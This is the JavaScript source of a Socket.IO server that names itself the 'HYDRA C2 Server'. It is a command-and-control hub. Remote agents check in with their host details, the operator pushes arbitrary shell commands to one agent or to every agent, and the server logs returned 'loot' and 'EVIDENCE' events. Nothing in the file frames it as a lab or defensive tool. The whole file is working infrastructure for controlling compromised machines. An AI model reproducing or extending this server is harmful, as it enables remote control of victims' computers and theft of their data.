const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

let agents = [];
let eventHistory = [];

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  socket.on('identify', (data) => {
    if (data.type === 'agent') {
        const existing = agents.find(a => a.id === data.id);
        if (existing) {
            existing.socketId = socket.id;
            existing.status = 'Online';
            existing.lastSeen = Date.now();
        } else {
            agents.push({
                socketId: socket.id,
                id: data.id || socket.id,
                ip: socket.handshake.address,
                os: data.os || 'Unknown',
                hostname: data.hostname || 'Unknown',
                status: 'Online',
                lastSeen: Date.now(),
                environment: data.environment || {}
            });
        }
        io.emit('agents_list', agents);
    } else if (data.type === 'ui') {
        socket.join('ui_room');
        socket.emit('agents_list', agents);
        socket.emit('history_dump', eventHistory.slice(-50)); 
    }
  });

  socket.on('agent_chunk', (chunk) => {
     io.to('ui_room').emit('agent_event', chunk);
     
     if (['SUCCESS', 'ERROR', 'loot', 'TELEMETRY', 'REPORT', 'EVIDENCE'].includes(chunk.type)) {
         eventHistory.push({ ...chunk, timestamp: Date.now() });
         if (eventHistory.length > 1000) eventHistory.shift();
     }
  });
  
  socket.on('exec_cmd', (data) => {
    const { targetId, cmd } = data;
    const target = agents.find(a => a.id === targetId);
    if (target) io.to(target.socketId).emit('command', { cmd });
    else if (targetId === 'all') agents.forEach(a => io.to(a.socketId).emit('command', { cmd }));
  });

  socket.on('disconnect', () => {
    const agent = agents.find(a => a.socketId === socket.id);
    if (agent) {
        agent.status = 'Offline';
        io.emit('agents_list', agents);
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`HYDRA C2 Server running on port ${PORT}`);
});
